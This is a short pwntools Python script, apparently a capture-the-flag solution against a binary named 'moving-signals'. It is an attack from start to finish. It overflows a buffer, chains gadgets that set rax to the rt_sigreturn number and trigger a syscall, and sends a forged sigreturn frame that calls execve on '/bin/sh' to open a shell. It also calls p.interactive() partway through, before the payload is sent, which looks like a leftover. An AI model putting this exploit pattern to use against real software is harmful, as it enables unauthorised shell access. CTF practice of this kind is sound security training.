from pwn import *

p = process(['gdb','./moving-signals'])
context.arch='amd64'

rax = 0x0000000000041018
syscall = 0x41015

chain = [rax,15,syscall]
chain = ''.join(map(p64,chain))
p.interactive()
binsh = 0x41250

#frame = p64(0)*13 + p64(binsh) + p64(0)*4 + p64(59) + p64(0)*2 + p64(syscall) + p64(0) + p64(0x33)
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

p.sendline('a'*8 + chain + str(frame))

p.interactive()
